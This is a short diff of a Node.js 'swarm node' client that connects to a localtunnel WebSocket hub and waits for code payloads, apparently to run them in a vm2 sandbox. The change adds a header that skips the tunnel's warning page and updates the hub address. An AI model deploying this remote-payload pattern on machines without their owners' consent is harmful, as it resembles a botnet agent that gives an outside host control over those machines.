@@ -1,11 +1,14 @@
 const WebSocket = require('ws');
 const { NodeVM } = require('vm2');
+const crypto = require('crypto');
 
-const HUB_URL = process.env.HUB_URL || 'wss://ripe-turkeys-fall.loca.lt';
+const HUB_URL = process.env.HUB_URL || 'wss://heavy-rivers-sink.loca.lt';
 
 function connectToHub() {
     console.log(`[SWARM NODE] Booting... Attempting uplink to ${HUB_URL}`);
-    const ws = new WebSocket(HUB_URL);
+    const ws = new WebSocket(HUB_URL, {
+        headers: { 'Bypass-Tunnel-Reminder': 'true' }
+    });
 
     ws.on('open', () => {
         console.log('[SWARM NODE] Uplink Established. Standing by for dynamic compilation payloads.');
@@ -39,7 +42,7 @@ function connectToHub() {
                 payload = parsed;
             }
         } catch (e) {
-            console.error('[SWARM NODE] Decryption failed or malformed payload. Dropping packet.');
+            console.error('[SWARM NODE] Payload parse error:', e.message);
             return;
         }
 
